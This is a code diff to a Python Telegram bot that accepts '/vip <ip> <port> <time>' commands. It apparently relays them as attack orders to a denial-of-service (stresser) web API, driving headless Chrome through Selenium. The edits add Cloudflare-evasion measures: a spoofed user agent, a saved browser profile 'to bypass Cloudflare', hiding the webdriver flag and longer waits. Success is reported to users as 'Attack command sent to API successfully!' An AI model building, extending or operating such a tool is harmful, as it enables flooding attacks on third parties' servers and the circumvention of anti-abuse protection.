@@ -2,7 +2,6 @@ import telebot
 import time
 import threading
 import os
-import json
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
@@ -14,18 +13,19 @@ OWNER_ID = 7459756974
 authorized_users = set()
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Chrome with user data (saved session)
+# Chrome options - REAL browser jaisa
 chrome_options = Options()
 chrome_options.add_argument('--headless=new')
 chrome_options.add_argument('--no-sandbox')
 chrome_options.add_argument('--disable-dev-shm-usage')
 chrome_options.add_argument('--disable-gpu')
-chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+chrome_options.add_argument('--window-size=1920,1080')
+chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
 chrome_options.add_argument('--disable-blink-features=AutomationControlled')
 chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
 chrome_options.add_experimental_option('useAutomationExtension', False)
 
-# Create temp dir for Chrome profile
+# Save Chrome profile to bypass Cloudflare
 user_data_dir = "/tmp/chrome_profile"
 os.makedirs(user_data_dir, exist_ok=True)
 chrome_options.add_argument(f"--user-data-dir={user_data_dir}")
@@ -37,6 +37,7 @@ def init_driver():
     if driver is None:
         service = Service()
         driver = webdriver.Chrome(service=service, options=chrome_options)
+        # Remove webdriver property
         driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
     return driver
 
@@ -47,8 +48,8 @@ def get_api_response(ip, port, time_val):
     print(f"🌐 Opening: {url}")
     driver.get(url)
     
-    # Wait for page load
-    time.sleep(15)
+    # Wait longer for Cloudflare
+    time.sleep(20)
     
     # Get page text
     page_text = driver.page_source
@@ -62,8 +63,7 @@ def get_api_response(ip, port, time_val):
 @bot.message_handler(commands=['start'])
 def start(message):
     if message.from_user.id == OWNER_ID:
-        bot.reply_to(message, "✅ Bot Active!\n\nCommands:\n/vip <ip> <port> <time>\n/add <user_id>\n/remove <user_id>")
-        bot.send_message(message.chat.id, "🌐 First time may take 30 seconds...")
+        bot.reply_to(message, "✅ Bot Active!\n\n/vip <ip> <port> <time>\n/add <user_id>\n/remove <user_id>")
     else:
         bot.reply_to(message, "❌ Unauthorized")
 
@@ -119,11 +119,13 @@ def vip_attack(message):
                     bot.send_photo(OWNER_ID, photo, caption=f"🎯 {ip}:{port} | {time_val}s\n👤 User: {message.from_user.id}")
                 os.remove(screenshot_path)
                 
-                # Send response to user
-                if "error" in response_text.lower() or "verify" in response_text.lower():
-                    bot.send_message(message.chat.id, f"⚠️ API Response:\n{response_text[:200]}")
+                # Check if Cloudflare bypassed
+                if "Just a moment" in response_text or "security verification" in response_text:
+                    bot.send_message(message.chat.id, "⚠️ Cloudflare block detected!\nScreenshot sent to owner for manual check.")
+                elif "Host:" in response_text:
+                    bot.send_message(message.chat.id, "✅ Attack command sent to API successfully!")
                 else:
-                    bot.send_message(message.chat.id, "✅ Attack command sent to API!")
+                    bot.send_message(message.chat.id, f"⚠️ API Response:\n{response_text[:200]}")
                     
             except Exception as e:
                 bot.send_message(OWNER_ID, f"❌ Error: {str(e)}")
@@ -135,15 +137,7 @@ def vip_attack(message):
 
 @bot.message_handler(commands=['status'])
 def status(message):
-    bot.reply_to(message, "🟢 Bot Running!\n✅ Chrome Ready\n✅ Session Saved")
+    bot.reply_to(message, "🟢 Bot Running!\n✅ Chrome Profile Saved")
 
 print("🤖 Starting Telegram Bot...")
-print(f"✅ Bot Token: {BOT_TOKEN[:10]}...")
-print("🔄 Polling started...")
-
-while True:
-    try:
-        bot.infinity_polling(timeout=60)
-    except Exception as e:
-        print(f"❌ Polling error: {e}")
-        time.sleep(5)
+bot.infinity_polling(timeout=60)
